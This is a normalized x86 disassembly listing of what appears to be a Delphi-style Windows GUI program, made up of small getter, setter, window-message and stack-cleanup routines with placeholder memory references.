sub_448674
jmp sub_4038d0
sub_448680
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_4483a8
sub_4487ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_424eb0
retn
sub_448815
jmp sub_4038d0
sub_44883c
jmp sub_4038d0
sub_4488be
jmp sub_4038d0
sub_4488e6
jmp sub_4038d0
sub_4488ed
mov esp ebp
pop ebp
retn
sub_4489a5
jmp sub_4038d0
sub_4489fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4489c8
mov [ ebx + 0x58 ] esi
sub_448b50
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_448b64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_448c4d
jmp sub_4038d0
sub_448c54
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448cd7
jmp sub_4038d0
sub_448cde
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4490ac
xor eax eax
retn
sub_4490b0
mov al [ eax + 0x58 ]
retn
sub_4490b4
xor eax eax
retn
sub_4490b8
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_4490c0
mov eax [ eax + 0x30 ]
retn
sub_449164
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_449210
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_449228
mov [ eax + 0x5d ] dl
retn
sub_44922c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44cf20
sub_44923c
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44971f
jmp sub_4038d0
sub_449726
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449788
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_44980c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_449929
jmp sub_4038d0
sub_449930
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449a2c
push eax
xor ecx ecx
mov edx 0xb037
call sub_44afd4
retn
sub_449bed
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403350
sub_449c9e
jmp sub_4038d0
sub_449ca5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449d7c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44afd4
sub_449d94
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44afd4
retn
sub_449da4
push edx
mov edx 0xd
call sub_44afd4
retn
sub_449db0
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_449dc4
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_449ea5
jmp sub_4038d0
sub_449eac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449eb4
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44afd4
sub_449f24
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_449f38
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_449f44
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_449f4c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44afd4
sub_449f70
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44afd4
sub_449f94
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44afd4
sub_449fdc
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_449fe4
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44afd4
sub_44a008
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44afd4
sub_44a02c
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44afd4
sub_44a048
push ebx
mov ebx eax
call sub_446fc8
cmp ebx eax
sete al
pop ebx
retn
sub_44a080
push esi
mov dl 0x1
mov si 0xffce
call sub_403350
pop esi
retn
sub_44a1ca
jmp sub_4038d0
sub_44a1d1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a2f4
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44a268
retn
sub_44a348
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44a35c
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44a441
jmp sub_4038d0
sub_44a460
xor eax eax
retn
sub_44a464
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44a47c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44a494
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44a4b0
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44a4c8
retn
sub_44a58c
retn
sub_44a590
cmp eax [ rw-data ]
sete al
retn
sub_44a604
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44a720
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403350
pop esi
pop ebp
retn 0x4
sub_44a760
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44a9f7
jmp sub_4038d0
sub_44a9fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44aa08
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403350
pop esi
retn
sub_44aa1c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403350
pop esi
retn
sub_44aceb
jmp sub_4038d0
sub_44ad94
push esi
mov si 0xffee
call sub_403350
pop esi
retn
sub_44ada0
mov al 0x1
retn
sub_44b078
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_449474
retn
sub_44b09c
retn
sub_44b2b5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c1a4
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44b2d0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e65c
retn
sub_44b3c8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44b9e0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44b9e8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44b9f0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44baa8
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44bac8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_449f70
mov [ ebx + 0x9a ] 0x1
sub_44bb20
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_449f14
mov [ ebx + 0x56 ] 0x1
sub_44bb44
mov [ edx + 0xc ] 0x1
retn
sub_44bb4c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44afd4
sub_44bb64
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44afd4
sub_44bb7c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44bde2
jmp sub_4038d0
sub_44bde9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44be14
mov eax [ r-xdata ]
retn
sub_44bfb0
jmp sub_4038d0
sub_44bfb7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c0d8
mov eax [ eax + 0xb8 ]
retn
sub_44c140
push ebx
mov ebx eax
mov eax ebx
call sub_44a464
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44c15c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44c2f4
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44c402
jmp sub_4038d0
sub_44c409
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44c438
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44c440
call sub_448ee0
retn
sub_44c540
jmp sub_4038d0
sub_44c700
jmp sub_4038d0
sub_44c750
jmp sub_4038d0
sub_44c788
retn
sub_44ca11
jmp sub_4038d0
sub_44cb99
jmp sub_4038d0
sub_44cefb
jmp sub_4038d0
sub_44cfa7
jmp sub_4038d0
sub_44cfb4
inc [ eax + 0x160 ]
retn
sub_44cfbc
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44cfdc
sub_44cfdc
xor edx edx
call sub_44cf20
retn
sub_44d0a9
jmp sub_4038d0
sub_44d0b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d19f
jmp sub_4038d0
sub_44d6c6
jmp sub_4038d0
sub_44d6cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d895
jmp sub_4038d0
sub_44d89c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d970
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44db5d
jmp sub_4038d0
sub_44db64
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44dc54
xor eax eax
retn
sub_44dcbc
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44afd4
sub_44ddea
jmp sub_40361c
sub_44df1f
jmp sub_4038d0
sub_44df26
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40361c#9
jmp sub_40361c
sub_44df35
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e4f0
jmp sub_4038d0
sub_44e4f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e500
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44e9fe
jmp sub_4038d0
sub_44ea50
push ebx
mov ebx eax
call sub_42367c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44afd4
pop ebx
retn
sub_44ea6c
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44afd4
retn
sub_44ea80
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44afd4
retn
sub_44ea90
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44afd4
retn
sub_44ed3c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450a2c
pop esi
retn
sub_44ee50
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44eea0
pop esi
retn
sub_44ee64
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44ef8c
pop esi
retn
sub_44ee78
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44ee8c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44ef7f
jmp sub_4038d0
sub_44ef86
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f016
jmp sub_4038d0
sub_44f01d
pop ebx
pop ecx
pop ebp
retn
sub_44f024
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44f034
retn
sub_44f038
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44f058
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44f1b8
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44f288
retn
sub_44f3a0
jmp sub_4038d0
sub_44f3a7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f472
jmp sub_4038d0
sub_44f49c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44f52e
jmp sub_4038d0
sub_44f700
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44f9a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44fa80
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44d4ac
pop esi
retn
sub_44fb44
push esi
mov si 0xffc1
call sub_403350
pop esi
retn
sub_44fb70
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44fb84
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44fb98
call sub_44d46c
retn
sub_44fba0
call sub_44d46c
retn
sub_44fba8
call sub_44d46c
retn
sub_44fc50
push ebx
mov ebx eax
mov eax ebx
call sub_44b9f0
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_4247f4
mov dx 0xb009
mov eax ebx
call sub_44d4ac
pop ebx
retn
sub_44fdb4
call sub_44d46c
retn
sub_44fdbc
call sub_44d46c
retn
sub_44fdc4
call sub_44d46c
retn
sub_44fdcc
call sub_44d46c
retn
sub_44fe30
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4502c6
jmp sub_4038d0
sub_4502cd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4503ac
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_450550
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44afd4
retn
sub_4505f0
push ebx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_45060c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_4507e4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_45071c
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_45083c
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44afd4
sub_45085c
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44afd4
sub_450880
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_45088c
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44afd4
sub_450938
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_4508dc
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_450a14
jmp sub_4038d0
sub_450a1b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450c3a
jmp sub_4038d0
sub_450c41
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_450d04
call sub_44ada4
retn
sub_451152
jmp sub_4038d0
sub_4511e8
mov eax [ r-xdata ]
retn
sub_45134f
jmp sub_4038d0
sub_451460
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44afd4
sub_451480
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44afd4
sub_451796
jmp sub_4038d0
sub_4518d8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_451a34
jmp sub_4038d0
sub_451a3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424eb0
retn
sub_451a57
jmp sub_4038d0
sub_451a64
retn
sub_451b38
mov [ edx + 0xc ] 0xffffffff
retn
sub_451b96
jmp sub_4038d0
sub_451b9d
pop ecx
pop ecx
pop ebp
retn
sub_451c3d
jmp sub_4038d0
sub_451c44
pop ebx
mov esp ebp
pop ebp
retn
sub_451cb0
call sub_44dc74
retn
sub_451d43
jmp sub_4038d0
sub_451d4a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_451f29
jmp sub_4038d0
sub_451f30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45208c
push ebx
mov ebx eax
mov eax ebx
call sub_456d9c
or edx 0xffffffff
mov eax ebx
call sub_4521b8
pop ebx
retn
sub_452164
jmp sub_4038d0
sub_4521b8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_4520a4
sub_452328
push ebx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_452340
push ebx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_45242c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44e8ac
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4524c7
jmp sub_4038d0
sub_4524ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4524f1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424eb0
retn
sub_4524ea
jmp sub_4038d0
sub_4524f1
pop ebx
pop ecx
pop ebp
retn
sub_4524f8
retn
sub_452560
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4528cd
jmp sub_4038d0
sub_452ab4
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_452ca0
jmp sub_4038d0
sub_452d50
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_452d64
inc [ eax + 0x6c ]
retn
sub_452d68
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4545e8
sub_452ec8
call sub_4535c8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_453873
jmp sub_4038d0
sub_45387a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453897
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_453890
jmp sub_4038d0
sub_453897
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453b78
jmp sub_4038d0
sub_453b7f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b9c
mov eax [ ebp - 0x4 ]
call sub_424eb0
retn
sub_453b95
jmp sub_4038d0
sub_453b9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453bb9
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_453bb2
jmp sub_4038d0
sub_453bb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45406d
jmp sub_4038d0
sub_454074
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4541ff
jmp sub_4038d0
sub_454206
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4542bb
jmp sub_4038d0
sub_4542c2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4543b0
jmp sub_4038d0
sub_454401
jmp sub_4038d0
sub_454408
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4544c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452dd4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_454610
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_452910
sub_454f10
jmp sub_4038d0
sub_454f17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454fe0
call GetCapture
retn
sub_454fe8
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cc70
pop ebx
retn
sub_454ff8
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_45525e
jmp sub_4038d0
sub_455458
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_45566c
jmp sub_4038d0
sub_455673
pop ebx
mov esp ebp
pop ebp
retn
sub_4556be
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_45573b
jmp sub_4038d0
sub_455742
pop ebp
retn
sub_4557ca
jmp sub_4038d0
sub_4557d1
pop ebp
retn
sub_455d38
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41860c
retn
sub_455d50
mov al 0x1
retn
sub_455d54
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_4213fc
retn
mov eax edx
retn
sub_455d64
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_4213cc
retn
mov al 0x1
retn
sub_456054
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4185b0
pop esi
pop ebx
retn
sub_456068
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_4560a4
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_456268
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_45627c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_456290
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_4562a4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_4562b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_4562cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_4562e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_4562f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_456308
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_45631c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_456330
retn
sub_456334
retn
sub_456338
retn
sub_45633c
retn
sub_456340
retn
sub_456344
retn
sub_456348
retn
sub_45634c
retn
sub_456350
retn
sub_456354
retn
sub_456358
retn
sub_45635c
retn
sub_456608
jmp sub_4038d0
sub_4569a4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
